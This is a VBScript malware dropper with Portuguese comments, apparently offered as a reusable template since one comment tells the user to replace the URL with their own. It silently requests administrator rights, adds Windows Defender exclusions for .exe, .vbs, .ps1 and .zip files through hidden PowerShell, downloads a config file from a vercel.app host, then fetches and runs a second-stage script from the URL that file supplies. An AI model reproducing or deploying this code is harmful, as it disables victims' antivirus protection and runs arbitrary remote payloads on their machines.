Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Elevação silenciosa para admin
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
    WScript.Quit
End If

' Adicionar exclusões em modo oculto
' Adicionar exclusões em modo oculto
WshShell.Run "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionExtension '.zip','.exe','.vbs','.ps1'""", 0, True

' URL do config.txt no servidor online
configURL = "https://privacy-58248-com.vercel.app/config.txt"  ' ← ALTERE PARA SUA URL
tempPath = WshShell.ExpandEnvironmentStrings("%TEMP%")
configPath = tempPath & "\online_config.txt"
finalVBSPath = tempPath & "\final_script.vbs"

On Error Resume Next

' Etapa 1: Baixar o config.txt do servidor online
WshShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & configURL & "' -OutFile '" & configPath & "'""", 0, True
WScript.Sleep(2000)

' Verificar se config.txt foi baixado
If fso.FileExists(configPath) Then
    ' Etapa 2: Ler a URL do VBS real do config.txt
    Set file = fso.OpenTextFile(configPath, 1)
    targetURL = file.ReadLine
    file.Close
    
    ' Etapa 3: Baixar o VBS real
    WshShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & targetURL & "' -OutFile '" & finalVBSPath & "'""", 0, True
    WScript.Sleep(3000)
    
    ' Etapa 4: Executar o VBS real
    If fso.FileExists(finalVBSPath) Then
        WshShell.Run "wscript.exe """ & finalVBSPath & """", 0, False
    Else
        ' Fallback: executar diretamente
        WshShell.Run targetURL, 1, False
    End If
Else
    ' Se não conseguir baixar o config, usar URL padrão
    WshShell.Run "https://google.com", 1, False
End If
